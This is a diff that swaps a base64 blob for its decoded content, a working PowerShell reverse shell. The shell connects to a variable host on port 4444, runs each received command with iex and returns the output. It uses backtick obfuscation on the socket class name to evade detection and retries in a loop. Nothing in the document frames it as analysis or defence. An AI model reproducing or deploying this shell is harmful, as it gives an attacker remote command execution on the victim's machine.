@@ -1,1 +1,14 @@
-DQpkb3sNCiR2ID0gNA0KJGEgPSBOZXctT2JqZWN0IFNgeVN0YGVtLk5gZVQuYHNgb2NrYGVUcy5UQ2BQQ2BsaWBlTnQoIiRpcCIsNDQ0NCkNCiRiID0gJGEuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYyA9IDAuLjY1NTM1fCV7MH0NCndoaWxlKCgkZCA9ICRiLlJlYWQoJGMsIDAsICRjLkxlbmd0aCkpIC1uZSAwKXsNCiRlID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYywwLCAkZCkNCiRmID0gKGlleCAkZSAyPiYxIHwgT3V0LVN0cmluZyApOyRnID0gJGYgKyAocHdkKS5QYXRoICsgJz4gJw0KJGggPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJGcpDQokYi5Xcml0ZSgkaCwwLCRoLkxlbmd0aCkNCiRiLkZsdXNoKCl9DQokYS5DbG9zZSgpDQpTbGVlcCAxMA0KfXdoaWxlICgkdiAtbGUgNSk=
+
+do{
+$v = 4
+$a = New-Object S`ySt`em.N`eT.`s`ock`eTs.TC`PC`li`eNt("$ip",4444)
+$b = $a.GetStream();[byte[]]$c = 0..65535|%{0}
+while(($d = $b.Read($c, 0, $c.Length)) -ne 0){
+$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $d)
+$f = (iex $e 2>&1 | Out-String );$g = $f + (pwd).Path + '> '
+$h = ([text.encoding]::ASCII).GetBytes($g)
+$b.Write($h,0,$h.Length)
+$b.Flush()}
+$a.Close()
+Sleep 10
+}while ($v -le 5)
